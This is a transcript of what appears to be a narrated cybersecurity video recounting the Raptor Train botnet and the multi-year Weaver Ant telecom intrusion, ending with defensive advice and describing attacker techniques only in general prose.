**2:21:03** · Second, install updates immediately. When your router, camera, or smart device says it needs an update, do it now. Not tomorrow. Not next week. Now. These updates patch the exact vulnerabilities hackers exploit. If you're an enterprise, consider implementing SASE solutions. That's Secure Access Service Edge—a security approach that monitors and protects network traffic to detect threats before they reach your devices.

**2:21:28** · If a traditional firewall is like a locked front door, SASE is like a smart security system.

**2:21:35** · For businesses, this is non-negotiable. For home users with multiple devices, it’s up to you.

**2:21:41** · Fourth, replace end-of-life devices. If the manufacturer no longer provides security updates, that device is a ticking time bomb. Old routers, cameras, and IoT devices without current support are prime targets for zero-day and n-day exploits—attacks targeting unpatched vulnerabilities. Every single one of those 385,000 compromised U.S. systems had an owner who thought, "It won't happen to me." Every small business, every home network, every smart device that fell to Raptor Train had someone who skipped an update or used a default password. The Raptor Train botnet may be neutralized, but let me ask you this: How many devices remain at risk today? That depends on what you do next.

**2:22:22** · Let me know if I should cover more Chinese botnets. I wanna hear what's best to watch.

### A disabled account suddenly reactivates on a busy network.

**2:22:30** · It begins with something so small, you'd almost certainly miss it. A disabled account suddenly reactivates on a busy network. Nothing really out of the ordinary in a network with an endless flow of logs. This is exactly what happened when Sygnia's forensic team spotted that single reactivated account during a routine system check.

**2:22:49** · What they found wasn't just a simple breach. It was a sophisticated, long-term infiltration using a variant of the China Chopper web shell. Let me explain what that means. A web shell is essentially a malicious script that gives attackers a backdoor into your systems.

**2:23:07** · China Chopper, which if you couldn’t guess is a Chinese backdoor, is particularly dangerous because of its simplicity. It’s often just a single line of code that can be uploaded to a vulnerable web server. Once there, it lets hackers execute commands, manage files remotely, and steal data right under the defenders' noses.

**2:23:31** · This particular variant was using military grade encryption to hide its communications.

**2:23:37** · When you encrypt malicious traffic this way, no one on the network can see what it truly is. To most people, they might just think “Oh, nothing to see here. Move along.”

**2:23:49** · Now this is the gross part. Are you ready? This tool hadn't been lurking in the network for days or weeks. It had been there for over four years.

**2:24:00** · This smells like a Chinese state-sponsored attack to me.

**2:24:03** · The reactivated account was just the first visible sign of a vast, hidden operation that had been running undetected for years.

**2:24:12** · And as you’re about to see, what they found was far more complex than I could’ve ever guessed.

**2:24:24** · The attackers' entry point? Embarrassingly simple. A misconfiguration in a public-facing application. Rookie mistake. Once inside, these intruders wasted no time. They deployed that AES-encrypted China Chopper web shell I mentioned earlier.

**2:24:42** · Shortly after establishing this foothold, the attackers introduced something new – a custom web shell they called "INMemory." This web shell had never been seen before.

**2:24:53** · What made INMemory particularly devious was its operational method. It contained a hardcoded string of characters that looked like meaningless gibberish. But that string was actually compressed and encoded data – what we call GZipped Base64. When activated, INMemory would decode this string into a program file called "eval.dll" and then execute it entirely in the computer's memory.

**2:25:20** · When malware runs only in memory – never touching the hard drive – it leaves virtually no forensic evidence behind. Once the computer restarts, the memory is wiped clean. It's like a burglar who can walk through your house without leaving footprints. But the true masterpiece of this operation was yet to come. The attackers built what we call an Operational Relay Box network – an ORB network. They identified and compromised numerous Zyxel CPE routers – specifically this model: VMG3625-T20A - they’re home internet devices that most people never think twice about.

**2:25:53** · These compromised routers became their criminal proxy network, bouncing their commands through innocent third-party devices.

**2:26:03** · When investigators tried to trace the source of the attack, they'd only find these compromised routers, not the actual attackers. Tracking them would not be possible.

**2:26:15** · The genius of this approach was that it allowed the attackers to pivot between different segments of the telecom network. Network segmentation is supposed to contain breaches – like compartments on a ship designed to prevent sinking.

**2:26:28** · But with this ORB network, the attackers could effortlessly traverse these boundaries, maintaining continuous, concealed access throughout the entire infrastructure.

**2:26:44** · This was a complete domination of the network. The attackers hadn't just infiltrated the telecom infrastructure – they'd mapped every inch of it. They basically owned it at this point.

**2:27:00** · Their secret weapon was something called “Web shell tunneling”.

**2:27:04** · Imagine creating a chain of messengers, each one passing notes to the next.

**2:27:09** · That's essentially what web shell tunneling does. The attackers chained multiple web shells together to act as proxy servers. Each web shell would receive an HTTP request, then use cURL commands – a tool for transferring data – to pass that request to the next web shell in line.

**2:27:26** · This created an unbroken chain of access between otherwise isolated network segments.

**2:27:31** · But the attackers weren't done. They systematically disabled the logging systems and disabled Event Tracing for Windows – effectively turning off the very tools that would normally record their activities. They even went after the Antimalware Scan Interface – AMSI – by modifying something called the AmsiScanBuffer in a file named amsi.dll.

**2:27:54** · This is the interface that Windows uses to scan files and memory for malicious content.

**2:27:59** · By compromising it, they ensured their tools wouldn't trigger security alerts.

**2:28:04** · Perhaps their most elegant evasion technique was how they executed PowerShell commands.

**2:28:08** · Instead of launching PowerShell.exe – which would be easily spotted – they loaded the core PowerShell engine, System.Management.Automation.dll, directly into memory. Same capabilities, no red flags.

**2:28:23** · The attackers also captured NTLM hashes – encrypted forms of user passwords – from high-privilege accounts. With these credentials, they could appear as legitimate administrators and access the most sensitive sections of the network.

**2:28:43** · How do you remove an infiltrator who knows your network better than you do?

**2:28:48** · If the attackers realized they'd been discovered, they might destroy evidence, plant more backdoors, or worse – use wiper malware to destroy the whole network.

**2:28:57** · Each layer of the attackers' infrastructure – the web shells, the tunneling methods, the evasion tactics – was eventually systematically exposed and countered 4 years later. But who knows, they might find a way back in. Static detection tools had to be deployed across the network. These tools are designed to recognize known malware. In this case, they were fine-tuned to identify the signatures of tools like China Chopper and INMemory.

**2:29:28** · It's important to understand what this work is really like. It's not the flashy, keyboard-pounding hacking you see in movies. It’s carefully crafting honeypots to lure the hacker out of hiding. Or it's spending hours combing through log files, doing grueling analysis of the network logs to distinguish legitimate activity from infiltration.

**2:29:49** · This is the reality of Cyber Security.

**2:29:56** · The ORB network – remember those compromised Zyxel routers? The home router VMG3625-T20A models that had been turned into traffic relays points? That infrastructure remains active. Still out there. Weaver Ant is still out there using it. The resources required to develop these custom tools, the patience to remain hidden for years, the sophistication to build multiple layers of concealment – this isn't the work of ordinary criminals. This is military hacking.

**2:30:32** · The China Chopper is a tool that's been known to defenders for years, yet these attackers modified it with such skill that it remained effective and undetected.

**2:30:41** · So while this specific breach has been contained, the larger operation continues.

**2:30:46** · In cybersecurity, we often talk about "advanced persistent threats" – APTs. This case shows exactly why that term exists. The "advanced" part is obvious from the technical sophistication.

**2:30:59** · But it's the "persistent" element that truly defines these actors. They don't give up. They adapt. They wait. And they return. Critical infrastructure – the systems that keep our modern society functioning – will continue to be targeted. Today it's telecommunications.

**2:31:18** · Tomorrow it might be a nuclear power plant. I am The Operator. Welcome to the new normal.